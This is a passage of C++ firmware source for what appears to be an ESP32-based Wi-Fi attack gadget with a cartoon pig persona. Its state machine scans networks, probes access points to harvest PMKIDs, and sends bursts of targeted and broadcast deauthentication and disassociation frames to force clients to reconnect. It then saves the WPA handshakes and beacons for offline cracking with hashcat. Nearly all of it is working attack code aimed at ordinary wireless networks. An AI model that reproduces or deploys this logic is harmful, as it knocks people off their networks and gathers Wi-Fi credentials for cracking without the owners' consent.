            NetworkRecon::exitCritical();
            yield();  // Break up the dequeue work between spinlock regions

            // Check if handshake is now complete
            if (hs.isComplete() && !hs.saved) {
                pendingHandshakeComplete = true;
                strncpy(pendingHandshakeSSID, hs.ssid, 32);
                pendingHandshakeSSID[32] = 0;
                WarhogMode::markCaptured(hs.bssid);

                NetworkRecon::enterCritical();
                for (auto& net : networks()) {
                    if (memcmp(net.bssid, hs.bssid, 6) == 0) {
                        net.hasHandshake = true;
                        break;
                    }
                }
                NetworkRecon::exitCritical();

                // Defer save to the next OinkMode::update() tick. Calling
                // autoSaveCheck() here stacks blocking SD I/O (100-500ms) with the
                // dequeue's spinlock work and starves the watchdog.
                pendingAutoSave = true;
            }
            
            // Handle PMKID from M1 if present
            if (frameLocal.hasPMKID) {
                int pIdx = findOrCreatePMKIDSafe(frameLocal.bssid, frameLocal.station);
                if (pIdx >= 0 && !pmkids[pIdx].saved) {
                    memcpy(pmkids[pIdx].pmkid, frameLocal.pmkid, 16);
                    pmkids[pIdx].timestamp = millis();
                    NetworkRecon::enterCritical();
                    for (const auto& net : networks()) {
                        if (memcmp(net.bssid, frameLocal.bssid, 6) == 0) {
                            strncpy(pmkids[pIdx].ssid, net.ssid, 32);
                            pmkids[pIdx].ssid[32] = 0;
                            break;
                        }
                    }
                    NetworkRecon::exitCritical();
                }
            }
        }
        hsProcessed++;
        yield();  // Release spinlocks, let Core 0 WiFi task run between dequeue iterations
    }
    if (hsDequeueCount <= 3 || (hsDequeueCount % 100) == 0) {
        Serial.printf("[OINK-DIAG] dequeue#%u exit processed=%u\r\n",
                      (unsigned)hsDequeueCount, (unsigned)hsProcessed);
    }
    
    // Process pending PMKID creation (callback queued, we do push_back here).
    // Same bounded pattern as the EAPOL dequeue above — cap + yield between iterations
    // to avoid starving the Core 0 WiFi task on PMKID bursts.
    {
        PendingPMKIDCreate pmkidPending = {};
        uint8_t pmkidProcessed = 0;
        const uint8_t kMaxPmkidPerTick = 2;
        while (pmkidProcessed < kMaxPmkidPerTick && dequeuePendingPMKID(pmkidPending)) {
            int idx = findOrCreatePMKIDSafe(pmkidPending.bssid, pmkidPending.station);
            if (idx >= 0 && !pmkids[idx].saved) {
                memcpy(pmkids[idx].pmkid, pmkidPending.pmkid, 16);
                pmkids[idx].timestamp = millis();

                // SSID lookup: try callback value first, then lookup from networks
                if (pmkidPending.ssid[0] != 0) {
                    strncpy(pmkids[idx].ssid, pmkidPending.ssid, 32);
                    pmkids[idx].ssid[32] = 0;
                } else {
                    for (const auto& net : networks()) {
                        if (memcmp(net.bssid, pmkidPending.bssid, 6) == 0) {
                            strncpy(pmkids[idx].ssid, net.ssid, 32);
                            pmkids[idx].ssid[32] = 0;
                            break;
                        }
                    }
                }
                WarhogMode::markCaptured(pmkids[idx].bssid);
            }
            pmkidProcessed++;
            yield();  // Let Core 0 WiFi task run between PMKID dequeue iterations
        }
    }
    
    // ============ End Deferred Event Processing ============
    
    // RELEASE LOCK EARLY - state machine doesn't need exclusive vector access
    // This minimizes packet drop window from ~10ms to ~0.5ms
    oinkBusy = false;
    
    // Periodic beacon data audit to prevent leaks (every 10s - Phase 3A fix)
    // Free beacon data from saved handshakes to reclaim heap
    static uint32_t lastBeaconAudit = 0;
    if (now - lastBeaconAudit > 10000) {
        // Hold oinkBusy to prevent callback from accessing handshakes[] during free
        const bool wasBusyAudit = oinkBusy;
        oinkBusy = true;
        for (auto& hs : handshakes) {
            if (hs.saved && hs.beaconData) {
                free(hs.beaconData);
                hs.beaconData = nullptr;
                hs.beaconLen = 0;
            }
        }
        oinkBusy = wasBusyAudit;
        lastBeaconAudit = now;
    }
    
    // Sync grass animation with channel hopping state
    Avatar::setGrassMoving(channelHopping);
    
    // Auto-attack state machine (like M5Gotchi)
    switch (autoState) {
        case AutoState::SCANNING:
            {
                uint16_t hopInterval = SwineStats::getChannelHopInterval();
                
                // Channel hopping during scan (buff-modified interval)
                if (now - lastHopTime > hopInterval) {
                    hopChannel();
                    lastHopTime = now;
                }
                
                // Random hunting sniff - shows piglet is actively sniffing
                // Check every 1 second with 8% chance = ~12 second average between sniffs
                if (now - lastRandomSniff > 1000) {
                    lastRandomSniff = now;  // Always reset timer on check
                    if (random(0, 100) < RANDOM_SNIFF_CHANCE) {
                        Avatar::sniff();
                    }
                }
                
                // Update mood
                if (now - lastMoodUpdate > 3000) {
                    Mood::onSniffing(networks().size(), currentChannel);
                    lastMoodUpdate = now;
                }
                
                // After scan time, sort and enter PMKID hunting
                if (now - stateStartTime > SCAN_TIME) {
                    if (!networks().empty()) {
                        sortNetworksByPriority();
                        autoState = AutoState::PMKID_HUNTING;
                        pmkidTargetIndex = -1;
                        pmkidProbeTime = 0;  // Reset timer for first target
                        pmkidProbedBitset = 0;
                        stateStartTime = now;
                        Mood::setStatusMessage("ghost farming");
                    } else {
                        // No networks found after scan time
                        consecutiveFailedScans++;
                        if (consecutiveFailedScans >= BORED_THRESHOLD) {
                            // Pig is bored - empty spectrum
                            autoState = AutoState::BORED;
                            stateStartTime = now;
                            channelHopping = false;
                            Mood::onBored(0);
                        } else {
                            // Keep scanning
                            stateStartTime = now;
                        }
                    }
                }
            }
            break;
            
        case AutoState::PMKID_HUNTING:
            {
                uint32_t huntElapsed = now - stateStartTime;
                
                // Timeout: 30s hunt window
                if (huntElapsed > PMKID_HUNT_MAX) {
                    autoState = AutoState::NEXT_TARGET;
                    stateStartTime = now;
                    Mood::setStatusMessage("weapons hot");
                    break;
                }
                
                // Only find new target if: first time OR timeout expired
                if (pmkidProbeTime == 0 || (now - pmkidProbeTime >= PMKID_TIMEOUT)) {
                    bool foundTarget = false;
                    uint8_t targetBssid[6] = {0};
                    char targetSSID[33] = {0};
                    uint8_t targetChannel = 0;
                    
                    const bool wasBusy = oinkBusy;
                    oinkBusy = true;
                    NetworkRecon::enterCritical();
                    size_t netCount = networks().size();
                    if (netCount > 0) {
                        for (int attempts = 0; attempts < (int)netCount && !foundTarget; attempts++) {
                            pmkidTargetIndex = (pmkidTargetIndex + 1) % netCount;
                            DetectedNetwork& net = networks()[pmkidTargetIndex];
                            
                            // Skip: Open, WEP, BOAR BRO, PMF, or already have PMKID
                            if (net.authmode == WIFI_AUTH_OPEN) continue;
                            if (net.authmode == WIFI_AUTH_WEP) continue;
                            if (isExcluded(net.bssid)) continue;  // BOAR BRO exclusion
                            if (net.ssid[0] == 0 || net.isHidden) continue;
                            if (net.hasPMF) continue;
                            
                            // Check if we already have PMKID for this AP
                            bool hasPMKID = false;
                            for (const auto& p : pmkids) {
                                if (memcmp(p.bssid, net.bssid, 6) == 0) {
                                    hasPMKID = true;
                                    break;
                                }
                            }
                            if (hasPMKID) continue;

                            // Skip networks already probed this cycle
                            if (pmkidTargetIndex < 64 && (pmkidProbedBitset & (1ULL << pmkidTargetIndex))) continue;

                            foundTarget = true;
                            memcpy(targetBssid, net.bssid, 6);
                            strncpy(targetSSID, net.ssid, 32);
                            targetSSID[32] = 0;
                            targetChannel = net.channel;
                        }
                    }
                    NetworkRecon::exitCritical();
                    oinkBusy = wasBusy;
                    
                    if (foundTarget) {
                        if (currentChannel != targetChannel) {
                            setChannel(targetChannel);
                        }
                        sendAssociationRequest(targetBssid, targetSSID, strlen(targetSSID));
                        pmkidProbeTime = now;
                        if (pmkidTargetIndex < 64) pmkidProbedBitset |= (1ULL << pmkidTargetIndex);
                        Avatar::sniff();
                    } else {
                        // No more targets to probe
                        autoState = AutoState::NEXT_TARGET;
                        stateStartTime = now;
                        Mood::setStatusMessage("weapons hot");
                    }
                }
                // else: still waiting for M1 response, do nothing
            }
            break;
            
        case AutoState::NEXT_TARGET:
            {
                // Use smart target selection
                int nextIdx = getNextTarget();
                
                if (nextIdx < 0) {
                    consecutiveFailedScans++;
                    
                    if (consecutiveFailedScans >= BORED_THRESHOLD) {
                        // Pig is bored - no targets for too long
                        autoState = AutoState::BORED;
                        stateStartTime = now;
                        channelHopping = false;  // Stop grass animation
                        deauthing = false;
                        Mood::onBored(networks().size());
                    } else {
                        // Keep trying - rescan
                        autoState = AutoState::SCANNING;
                        stateStartTime = now;
                        channelHopping = true;
                        deauthing = false;
                        Mood::setStatusMessage("sniff n drift");
                    }
                    break;
                }
                
                // Found a target - reset failed scan counter
                consecutiveFailedScans = 0;
                
                // Revalidate: Network might have been removed between getNextTarget() and here
                if (nextIdx >= (int)networks().size()) {
                    autoState = AutoState::SCANNING;
                    stateStartTime = now;
                    channelHopping = true;
                    break;
                }
                
                selectionIndex = nextIdx;
                
                // Select this target (locks to channel, stops hopping)
                selectTarget(selectionIndex);
                networks()[selectionIndex].attackAttempts++;
                
                // Go to LOCKING state to discover clients before attacking
                autoState = AutoState::LOCKING;
                stateStartTime = now;
                deauthing = false;  // Don't deauth yet, just listen
                channelHopping = false;  // Ensure channel stays locked during capture phase
                
                Mood::setStatusMessage("sniffin clients");
                Avatar::sniff();  // Nose twitch when sniffing for auths
            }
            break;
            
        case AutoState::LOCKING:
            {
            // Wait on target channel to discover clients via data frames
            // This is crucial - targeted deauth is much more effective
            if (targetIndex < 0) {
                autoState = AutoState::NEXT_TARGET;
                stateStartTime = now;
                deauthing = false;
                channelHopping = true;
                break;
            }
            
            // Rebind target index by BSSID snapshot (avoid stale index/races)
            DetectedNetwork targetCopy = {};
            int foundIdx = -1;
            const bool wasBusy = oinkBusy;
            oinkBusy = true;
            NetworkRecon::enterCritical();
            for (int i = 0; i < (int)networks().size(); i++) {
                if (memcmp(networks()[i].bssid, targetBssid, 6) == 0) {
                    targetCopy = networks()[i];
                    foundIdx = i;
                    break;
                }
            }
            NetworkRecon::exitCritical();
            oinkBusy = wasBusy;

            if (foundIdx < 0) {
                autoState = AutoState::NEXT_TARGET;
                stateStartTime = now;
                deauthing = false;
                channelHopping = true;
                targetIndex = -1;
                memset(targetBssid, 0, 6);
                clearTargetClients();
                break;
            }

            targetIndex = foundIdx;
            {
                uint32_t lockElapsed = now - stateStartTime;
                
                // Use OinkMode's own client tracking from promiscuous callback.
                // NetworkRecon's lastDataSeen is stale because OINK overrides its
                // promiscuous callback — NetworkRecon never sees data frames.
                bool hasRecentClient = false;
                {
                    const bool wasBusy = oinkBusy;
                    oinkBusy = true;
                    if (targetClientCount > 0) {
                        for (uint8_t c = 0; c < targetClientCount; c++) {
                            if (now - targetClients[c].lastSeen <= CLIENT_RECENT_MS) {
                                hasRecentClient = true;
                                break;
                            }
                        }
                    }
                    oinkBusy = wasBusy;
                }

                if (!hasRecentClient && lockElapsed >= LOCK_EARLY_EXIT_MS) {
                    autoState = AutoState::NEXT_TARGET;
                    stateStartTime = now;
                    deauthing = false;
                    channelHopping = true;
                    targetIndex = -1;
                    memset(targetBssid, 0, 6);
                    clearTargetClients();
                    break;
                }

                if (hasRecentClient && lockElapsed >= LOCK_FAST_TRACK_MS) {
                    autoState = AutoState::ATTACKING;
                    attackStartTime = now;
                    deauthCount = 0;
                    deauthing = true;
                    break;
                }

                if (lockElapsed > SwineStats::getLockTime()) {
                    autoState = AutoState::ATTACKING;
                    attackStartTime = now;
                    deauthCount = 0;
                    deauthing = true;
                }
            }
            // DIAG: yield in LOCKING to prevent TG1WDT. Quick spinlock work above
            // shouldn't starve watchdog, but a yield here costs nothing and may
            // help if the LOCKING→ATTACKING transition has a hidden delay.
            yield();
            break;
            }
            
        case AutoState::ATTACKING:
            {
                // Snapshot target data to avoid races with callback updates
                bool targetFound = false;
                uint8_t targetBssidLocal[6] = {0};
                char targetSSIDLocal[33] = {0};
                bool targetHasPMF = false;
                uint8_t clientCountLocal = 0;
                uint8_t clientMacs[MAX_CLIENTS_PER_NETWORK][6] = {};

                const bool wasBusy = oinkBusy;
                oinkBusy = true;
                NetworkRecon::enterCritical();
                for (int i = 0; i < (int)networks().size(); i++) {
                    if (memcmp(networks()[i].bssid, targetBssid, 6) == 0) {
                        targetFound = true;
                        targetIndex = i;
                        memcpy(targetBssidLocal, networks()[i].bssid, 6);
                        strncpy(targetSSIDLocal, networks()[i].ssid, 32);
                        targetSSIDLocal[32] = 0;
                        targetHasPMF = networks()[i].hasPMF;
                        break;
                    }
                }
                NetworkRecon::exitCritical();

                if (targetFound) {
                    clientCountLocal = targetClientCount;
                    if (clientCountLocal > MAX_CLIENTS_PER_NETWORK) {
                        clientCountLocal = MAX_CLIENTS_PER_NETWORK;
                    }
                    for (uint8_t c = 0; c < clientCountLocal; c++) {
                        memcpy(clientMacs[c], targetClients[c].mac, 6);
                    }
                }

                oinkBusy = wasBusy;

                if (!targetFound) {
                    autoState = AutoState::NEXT_TARGET;
                    stateStartTime = now;
                    deauthing = false;
                    channelHopping = true;
                    targetIndex = -1;
                    memset(targetBssid, 0, 6);
                    clearTargetClients();
                    break;
                }

                // Send deauth burst every 180ms (optimal rate per research - prevents queue saturation)
                if (now - lastDeauthTime > 180) {
                    PCSnapshot::checkpoint(PCSnapshot::PHASE_OINK_DEAUTH);
                    // Skip if PMF (shouldn't happen but safety check)
                    if (targetHasPMF) {
                        selectionIndex++;
                        autoState = AutoState::NEXT_TARGET;
                        break;
                    }
                    
                    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

                    // Skip channel verification if NetworkRecon is paused (WiFi state unstable during pause/resume)
                    if (!NetworkRecon::isPaused()) {
                        uint8_t actualCh = 0;
                        wifi_second_chan_t secondCh = WIFI_SECOND_CHAN_NONE;
                        esp_wifi_get_channel(&actualCh, &secondCh);
                        if (actualCh != currentChannel && actualCh != 0) {
                            Serial.printf("[OINK] CH MISMATCH! oinkCh=%d actualCh=%d — re-locking\r\n", currentChannel, (int)actualCh);
                            setChannel(currentChannel);
                        }
                    }
                    // PRIORITY 1: Target specific clients (MOST EFFECTIVE)
                    // Targeted deauth is much more reliable than broadcast
                    if (clientCountLocal > 0) {
                        // Get buff-modified burst count (base 5, buffed up to 8, debuffed down to 3)
                        uint8_t burstCount = SwineStats::getDeauthBurstCount();
                        // CRITICAL FIX: Limit clients per cycle to prevent WDT reset
                        // With 20 clients × burst delays, blocking time could exceed 1.5s
                        // Process max 4 clients per cycle, rotate through on next cycles
                        static uint8_t clientStartIdx = 0;
                        uint8_t clientsThisCycle = (clientCountLocal > 4) ? 4 : clientCountLocal;
                        for (uint8_t i = 0; i < clientsThisCycle; i++) {
                            uint8_t c = (clientStartIdx + i) % clientCountLocal;
                            // Send buff-modified deauths
                            sendDeauthBurst(targetBssidLocal, clientMacs[c], burstCount);
                            deauthCount += burstCount;
                            
                            // Also disassoc targeted client
                            sendDisassocFrame(targetBssidLocal, clientMacs[c], 8);
                            
                            // Yield to watchdog after each client to prevent WDT reset
                            yield();
                        }
                        clientStartIdx = (clientStartIdx + clientsThisCycle) % clientCountLocal;
                    }
                    
                    // PRIORITY 2: Broadcast deauth (less effective, but catches unknown clients)
                    // Only send when no clients discovered - reduces noise pollution
                    if (clientCountLocal == 0) {
                        sendDeauthFrame(targetBssidLocal, broadcast, 7);
                        sendDisassocFrame(targetBssidLocal, broadcast, 8);  // Some devices respond to disassoc only
                        deauthCount++;
                    }
                    
                    lastDeauthTime = now;
                }
                
                // Update mood with attack progress
                if (now - lastMoodUpdate > 2000) {
                    if (targetSSIDLocal[0] != 0) {
                        Mood::onDeauthing(targetSSIDLocal, deauthCount);
                    }
                    lastMoodUpdate = now;
                }
                
                // Check if handshake captured - use BSSID lookup instead of targetIndex
                // to avoid marking wrong network if cleanup shifted indices.
                //
                // Lock-window fix (2026-06-17): the previous version held
                // NetworkRecon::vectorMux across the entire O(handshakes × networks)
                // nested loop, which could starve the Core 0 WiFi task and trigger
                // TG1WDT. Now we do BSSID lookups via findNetwork() (which takes
                // the lock briefly per call and copies the entry) and only re-take
                // the lock once at the end for the hasHandshake flag writes.
                bool targetHandshakeCaptured = false;
                char targetHandshakeSSID[33] = {0};

                // First pass: look up each complete handshake's BSSID, capturing
                // any target SSID match. No lock held during the iteration.
                struct PendingFlag {
                    uint8_t bssid[6];
                };
                PendingFlag pendingFlags[8];  // bounded; MAX_HANDSHAKES is the real cap
                uint8_t pendingFlagCount = 0;

                for (const auto& hs : handshakes) {
                    if (!hs.isComplete()) continue;
                    DetectedNetwork netCopy;
                    if (!NetworkRecon::findNetwork(hs.bssid, &netCopy)) continue;

                    if (pendingFlagCount < 8) {
                        memcpy(pendingFlags[pendingFlagCount].bssid, hs.bssid, 6);
                        pendingFlagCount++;
                    }

                    if (targetIndex >= 0 && targetIndex < (int)NetworkRecon::getNetworkCount() &&
                        memcmp(targetBssid, hs.bssid, 6) == 0) {
                        targetHandshakeCaptured = true;
                        strncpy(targetHandshakeSSID, netCopy.ssid, 32);
                        targetHandshakeSSID[32] = 0;
                    }
                }

                // Second pass: take the lock ONCE to set all hasHandshake flags.
                const bool wasBusyHandshake = oinkBusy;
                oinkBusy = true;
                if (pendingFlagCount > 0) {
                    NetworkRecon::enterCritical();
                    for (uint8_t k = 0; k < pendingFlagCount; k++) {
                        int idx = NetworkRecon::findNetworkIndex(pendingFlags[k].bssid);
                        if (idx >= 0) {
                            networks()[idx].hasHandshake = true;
                        }
                    }
                    NetworkRecon::exitCritical();
                }
                oinkBusy = wasBusyHandshake;
                if (targetHandshakeCaptured) {
                    if (targetHandshakeSSID[0] != 0) {
                        SDLog::log("OINK", "Handshake captured: %s", targetHandshakeSSID);
                    } else {
                        SDLog::log("OINK", "Handshake captured");
                    }
                    autoState = AutoState::WAITING;
                    stateStartTime = now;
                    deauthing = false;
                }
                
                // Timeout - move to next target
                if (autoState == AutoState::ATTACKING && now - attackStartTime > ATTACK_TIMEOUT) {
                    NetworkRecon::enterCritical();
                    for (auto& net : networks()) {
                        if (memcmp(net.bssid, targetBssid, 6) == 0) {
                            // Scale cooldown by RSSI: strong signals retry faster (likely timing issue),
                            // weak signals wait longer (likely signal issue)
                            int8_t tRssi = (net.rssiAvg != 0) ? net.rssiAvg : net.rssi;
                            uint32_t cooldown;
                            if (tRssi >= -45) cooldown = 4000;
                            else if (tRssi >= -55) cooldown = 6000;
                            else if (tRssi >= -65) cooldown = 8000;
                            else cooldown = 12000;
                            net.cooldownUntil = now + cooldown;
                            break;
                        }
                    }
                    NetworkRecon::exitCritical();

                    autoState = AutoState::WAITING;
                    stateStartTime = now;
                    deauthing = false;
                    // Keep channel locked during WAITING to catch late EAPOL responses
                    // Channel hopping resumes only when moving to NEXT_TARGET with no pending handshake
                }
                break;
            }
            
        case AutoState::WAITING:
            // Brief pause between attacks - keep channel locked for late EAPOL frames
            if (now - stateStartTime > WAIT_TIME) {
                // Check for incomplete handshake only once at WAIT_TIME threshold
                // to avoid repeated vector iteration overhead
                // (statics moved to file scope and reset in init())
                
                if (!checkedForPendingHandshake) {
                    checkedForPendingHandshake = true;
                    hasPendingHandshake = false;
                    if (targetIndex >= 0 && targetIndex < (int)networks().size()) {
                        const bool wasBusy = oinkBusy;
                        oinkBusy = true;
                        NetworkRecon::enterCritical();
                        for (const auto& hs : handshakes) {
                            if (memcmp(hs.bssid, networks()[targetIndex].bssid, 6) == 0 && 
                                hs.hasM1() && !hs.hasM2()) {
                                hasPendingHandshake = true;
                                break;
                            }
                        }
                        NetworkRecon::exitCritical();
                        oinkBusy = wasBusy;
                    }
                }
                
                if (hasPendingHandshake && now - stateStartTime < WAIT_TIME * 2) {
                    // Extended wait for pending handshake (up to 2x normal = 4 sec total)
                    break;
                }
                
                // Reset for next WAITING state
                checkedForPendingHandshake = false;
                hasPendingHandshake = false;
                autoState = AutoState::NEXT_TARGET;
            }
            break;
            
        case AutoState::BORED:
            // Pig is bored - no valid targets available
            // Stop grass, show bored phrases, periodically retry
            
            // Adaptive channel hop: fast sweep (500ms) when spectrum is empty
            // or all networks are below RSSI threshold (user is moving),
            // slow (2000ms) when strong networks present but none are valid targets
            uint32_t boredHopInterval;
            if (networks().empty()) {
                boredHopInterval = 500;
            } else {
                bool anyStrong = false;
                NetworkRecon::enterCritical();
                for (size_t i = 0; i < networks().size() && i < 20; i++) {
                    int8_t r = (networks()[i].rssiAvg != 0) ? networks()[i].rssiAvg : networks()[i].rssi;
                    if (r >= Config::wifi().attackMinRssi) { anyStrong = true; break; }
                }
                NetworkRecon::exitCritical();
                boredHopInterval = anyStrong ? 2000 : 500;
            }
            if (now - lastHopTime > boredHopInterval) {
                hopChannel();
                lastHopTime = now;
            }
            
            // Update bored mood every 5 seconds
            if (now - lastBoredUpdate > 5000) {
                Mood::onBored(networks().size());
                lastBoredUpdate = now;
            }
            
            // Check if new networks appeared (promiscuous mode still active)
            if (!networks().empty()) {
                int nextIdx = getNextTarget();
                if (nextIdx >= 0) {
                    // New valid target appeared!
                    consecutiveFailedScans = 0;
                    autoState = AutoState::NEXT_TARGET;
                    channelHopping = true;
                    Mood::setStatusMessage("new bacon!");
                    Avatar::sniff();
                    break;
                }
            }
            
            // Periodic retry - do a fresh scan every 30 seconds
            if (now - stateStartTime > BORED_RETRY_TIME) {
                autoState = AutoState::SCANNING;
                stateStartTime = now;
                channelHopping = true;
                consecutiveFailedScans = 0;  // Reset for fresh attempt
            }
            break;
    }
    
    // NOTE: Network cleanup is now handled centrally by NetworkRecon::cleanupStaleNetworks()
    // which runs every 5 seconds. This eliminates dual cleanup race conditions.
    // OINK only needs to revalidate its indices when networks change.
    
    // Periodic index revalidation (in case NetworkRecon cleaned up our target)
    if (now - lastCleanupTime > 5000) {
        lastCleanupTime = now;
        
        // Revalidate targetIndex using stored BSSID
        if (targetIndex >= 0) {
            NetworkRecon::enterCritical();
            int foundIdx = -1;
            for (int i = 0; i < (int)networks().size(); i++) {
                if (memcmp(networks()[i].bssid, targetBssid, 6) == 0) {
                    foundIdx = i;
                    break;
                }
            }
            NetworkRecon::exitCritical();
            
            if (foundIdx != targetIndex) {
                targetIndex = foundIdx;
                if (targetIndex < 0) {
                    deauthing = false;
                    channelHopping = true;
                    memset(targetBssid, 0, 6);
                    clearTargetClients();
                }
            }
        }
        
        // Bounds check selectionIndex
        NetworkRecon::enterCritical();
        if (!networks().empty() && selectionIndex >= (int)networks().size()) {
            selectionIndex = networks().size() - 1;
        } else if (networks().empty()) {
            selectionIndex = 0;
        }
        NetworkRecon::exitCritical();
    }
    
    // Emergency heap recovery - also batched (max 3 per cycle)
    // 3 erases from front = ~620µs, safely under 1ms WiFi budget
    // PHASE 1 FIX: Preserve current target if possible
    if (ESP.getFreeHeap() < HeapPolicy::kMinHeapForOinkNetworkAdd && networks().size() > 50) {
        oinkBusy = true;
        NetworkRecon::enterCritical();
        
        int emergencyErased = 0;
        while (networks().size() > 50 && emergencyErased < 3) {
            // Preserve current target if possible
            if (targetIndex >= 0 && networks().size() > 1) {
                // Check if oldest is target - if so, swap with next oldest before erasing
                if (memcmp(networks()[0].bssid, targetBssid, 6) == 0) {
                    // Target is oldest - swap with second oldest to preserve it
                    if (networks().size() > 1) {
                        std::swap(networks()[0], networks()[1]);
                    }
                }
            }
            networks().erase(networks().begin());
            emergencyErased++;
        }
        
        // Revalidate target by BSSID instead of blanket reset
        if (emergencyErased > 0 && targetIndex >= 0) {
            int foundIdx = -1;
            for (int i = 0; i < (int)networks().size(); i++) {
                if (memcmp(networks()[i].bssid, targetBssid, 6) == 0) {
                    foundIdx = i;
                    break;
                }
            }
            targetIndex = foundIdx;
            if (targetIndex < 0) {
                // Target was erased - only now do we abort
                deauthing = false;
                channelHopping = true;
                memset(targetBssid, 0, 6);
                clearTargetClients();
            }
        }
        
        // Reset selection index regardless
        if (emergencyErased > 0) {
            selectionIndex = 0;
        }
        
        NetworkRecon::exitCritical();
        oinkBusy = false;
    }

    updateTargetCache();
}

void OinkMode::startScan() {
    scanning = true;
    channelHopping = true;
    currentHopIndex = 0;
}

void OinkMode::stopScan() {
    scanning = false;
}

void OinkMode::selectTarget(int index) {
    if (index >= 0 && index < (int)networks().size()) {
        clearTargetClients();
        targetIndex = index;
        memcpy(targetBssid, networks()[index].bssid, 6);  // Store BSSID
        networks()[index].isTarget = true;
        
        // Clear old beacon frame when target changes (static storage, no free)
        beaconFrame = beaconFrameStorage;
        beaconFrameLen = 0;
        beaconCaptured = false;
        
        // Lock to target's channel
        channelHopping = false;
        setChannel(networks()[index].channel);
        
        // Auto-start deauth when target selected
        deauthing = true;
    }

    updateTargetCache();
}

void OinkMode::clearTarget() {
    if (targetIndex >= 0 && targetIndex < (int)networks().size()) {
        networks()[targetIndex].isTarget = false;
    }
    targetIndex = -1;
    memset(targetBssid, 0, 6);
    clearTargetClients();
    deauthing = false;
    channelHopping = true;
    // Unlock channel so NetworkRecon resumes hopping
    if (NetworkRecon::isChannelLocked()) {
        NetworkRecon::unlockChannel();
    }
    updateTargetCache();
}

DetectedNetwork* OinkMode::getTarget() {
    if (targetIndex >= 0 && targetIndex < (int)networks().size()) {
        return &networks()[targetIndex];
    }
    return nullptr;
}

void OinkMode::moveSelectionUp() {
    if (networks().empty()) return;
    selectionIndex--;
    if (selectionIndex < 0) selectionIndex = networks().size() - 1;
}

void OinkMode::moveSelectionDown() {
    if (networks().empty()) return;
    selectionIndex++;
    if (selectionIndex >= (int)networks().size()) selectionIndex = 0;
}

void OinkMode::confirmSelection() {
    if (networks().empty()) return;
    if (selectionIndex >= 0 && selectionIndex < (int)networks().size()) {
        selectTarget(selectionIndex);
    }
}

void OinkMode::startDeauth() {
    if (!running || targetIndex < 0) return;
    
    deauthing = true;
    channelHopping = false;
}

void OinkMode::stopDeauth() {
    deauthing = false;
}

void OinkMode::setChannel(uint8_t ch) {
    if (ch < 1 || ch > 14) return;
    currentChannel = ch;
    // Use NetworkRecon's channel lock to prevent hopping during target lock
    NetworkRecon::lockChannel(ch);
}

void OinkMode::enableChannelHop(bool enable) {
    channelHopping = enable;
}

void OinkMode::hopChannel() {
    // Unlock NetworkRecon channel and let it handle hopping
    // OINK no longer needs to hop itself - NetworkRecon does this
    if (NetworkRecon::isChannelLocked()) {
        NetworkRecon::unlockChannel();
    }
    // Sync our currentChannel with NetworkRecon's for display purposes
    currentChannel = NetworkRecon::getCurrentChannel();
}

void OinkMode::promiscuousCallback(const wifi_promiscuous_pkt_t* pkt, wifi_promiscuous_pkt_type_t type) {
    // This callback is registered with NetworkRecon for OINK-specific packet processing
    // NetworkRecon already handles beacon/network tracking, so we focus on:
    // 1. Beacon capture for target AP (for PCAP)
    // 2. Data frame processing (EAPOL/handshake capture)
    
    if (!pkt) return;
    if (!running) return;
    if (oinkBusy) return;
    
    uint16_t len = pkt->rx_ctrl.sig_len;
    int8_t rssi = pkt->rx_ctrl.rssi;
    
    // ESP32 adds 4 ghost bytes to sig_len
    if (len > 4) len -= 4;
    if (len < 24) return;

    packetCount.fetch_add(1, std::memory_order_relaxed);
    
    const uint8_t* payload = pkt->payload;
    uint8_t frameSubtype = (payload[0] >> 4) & 0x0F;
    
    switch (type) {
        case WIFI_PKT_MGMT:
            if (frameSubtype == 0x08) {  // Beacon
                // Only capture beacon for target AP (PCAP needs it)
                processBeacon(payload, len, rssi);
            }
            // Note: Probe responses handled by NetworkRecon for SSID reveal
            break;
            
        case WIFI_PKT_DATA:
            // EAPOL/handshake capture (OINK's main job)
            processDataFrame(payload, len, rssi);
            break;
            
        default:
            break;
    }
}

void OinkMode::processBeacon(const uint8_t* payload, uint16_t len, int8_t rssi) {
    // NOTE: Network discovery is now handled by NetworkRecon
    // This function only captures beacon for target AP (needed for PCAP/hashcat)
    
    if (len < 36) return;
    
    const uint8_t* bssid = payload + 16;
    
    // Capture beacon for target AP only
    // Use BSSID match instead of targetIndex for cross-core safety (callback runs on core 1,
    // targetIndex is written on core 0 and can become stale after cleanupStaleNetworks)
    if (!beaconCaptured && targetBssid[0] != 0) {
        if (memcmp(bssid, targetBssid, 6) == 0) {
            if (len > MAX_BEACON_SIZE) {
                return;  // Drop oversized beacon
            }
            memcpy(beaconFrameStorage, payload, len);
            beaconFrame = beaconFrameStorage;
            beaconFrameLen = len;
            beaconCaptured = true;
        }
    }
    
    // hasHandshake flag update REMOVED from per-beacon callback path.
    // Previously: enterCritical + iterate networks × handshakes on EVERY beacon.
    // With 22+ APs, this spinlock ran hundreds of times/sec on core 0,
    // starving the idle task watchdog → TG1WDT_SYS_RST.
    // Now: hasHandshake is set at capture time in ATTACKING state handler
    // (line ~1138) and in processDeferredHandshakes — main thread context,
    // no interrupt-path overhead. CYD port confirmed: no per-beacon spinlock.
}

// Note: Legacy processBeacon network discovery code removed
// Network tracking is now handled by NetworkRecon

void OinkMode::processProbeResponse(const uint8_t* payload, uint16_t len, int8_t rssi) {
    // Probe responses reveal hidden SSIDs
    if (len < 36) return;
    
    const uint8_t* bssid = payload + 16;
    
    // NOTE: Network discovery is now handled by NetworkRecon
    // OINK probe response processing only updates existing networks for SSID reveal
    int idx = findNetwork(bssid);
    if (idx < 0) {
        return;  // Network not yet tracked by NetworkRecon - skip
    }
    
    // Protect all network vector accesses with spinlock
    NetworkRecon::enterCritical();
    
    // Revalidate index after acquiring lock (vector may have changed)
    if (idx >= (int)networks().size()) {
        NetworkRecon::exitCritical();
        return;
    }
    
    // If network has hidden SSID, try to extract from probe response
    if (networks()[idx].ssid[0] == 0 || networks()[idx].isHidden) {
        uint16_t offset = 36;
        while (offset + 2 < len) {
            uint8_t id = payload[offset];
            uint8_t ieLen = payload[offset + 1];
            
            if (offset + 2 + ieLen > len) break;
            
            if (id == 0 && ieLen > 0 && ieLen <= 32) {
                memcpy(networks()[idx].ssid, payload + offset + 2, ieLen);
                networks()[idx].ssid[ieLen] = 0;
                networks()[idx].isHidden = false;
                
                // DEFERRED: Queue mood event for main thread
                if (!pendingNewNetwork) {
                    strncpy(pendingNetworkSSID, networks()[idx].ssid, 32);
                    pendingNetworkSSID[32] = 0;
                    pendingNetworkRSSI = rssi;
